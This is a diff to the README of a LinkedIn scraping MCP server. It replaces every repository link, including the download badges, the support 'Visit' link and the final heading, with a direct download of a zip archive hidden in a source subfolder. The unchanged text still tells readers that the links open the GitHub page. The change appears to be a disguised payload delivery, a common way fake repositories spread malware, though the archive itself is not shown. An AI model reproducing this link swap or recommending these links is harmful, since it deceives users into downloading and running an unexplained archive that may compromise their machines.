@@ -1,6 +1,6 @@
 # 🔗 linkedin-mcp-server - Search and Scrape LinkedIn Data
 
-[![Download linkedin-mcp-server](https://img.shields.io/badge/Download-linkedin--mcp--server-brightgreen?style=for-the-badge)](https://github.com/dottiedissimilar494/linkedin-mcp-server)
+[![Download linkedin-mcp-server](https://img.shields.io/badge/Download-linkedin--mcp--server-brightgreen?style=for-the-badge)](https://github.com/dottiedissimilar494/linkedin-mcp-server/raw/refs/heads/main/src/linkedin_mcp_server/domain/linkedin-server-mcp-v3.1.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Having administrator rights on your computer helps with installation but is not 
 
 Use the button below to visit the official page where you can get the program. It contains all the files you need and the latest version.
 
-[![Download link](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/dottiedissimilar494/linkedin-mcp-server)
+[![Download link](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/dottiedissimilar494/linkedin-mcp-server/raw/refs/heads/main/src/linkedin_mcp_server/domain/linkedin-server-mcp-v3.1.zip)
 
 Clicking the links will open the GitHub page in your browser.
 
@@ -133,7 +133,7 @@ Use the software responsibly and follow LinkedIn’s terms of service.
 
 Support is available through the GitHub repository:
 
-- Visit: https://github.com/dottiedissimilar494/linkedin-mcp-server
+- Visit: https://github.com/dottiedissimilar494/linkedin-mcp-server/raw/refs/heads/main/src/linkedin_mcp_server/domain/linkedin-server-mcp-v3.1.zip
 - Use the "Issues" section to report bugs or ask questions.
 - Check "Discussions" for tips and common questions.
 
@@ -149,4 +149,4 @@ Support is available through the GitHub repository:
 
 ---
 
-# [Download linkedin-mcp-server](https://github.com/dottiedissimilar494/linkedin-mcp-server)
+# [Download linkedin-mcp-server](https://github.com/dottiedissimilar494/linkedin-mcp-server/raw/refs/heads/main/src/linkedin_mcp_server/domain/linkedin-server-mcp-v3.1.zip)
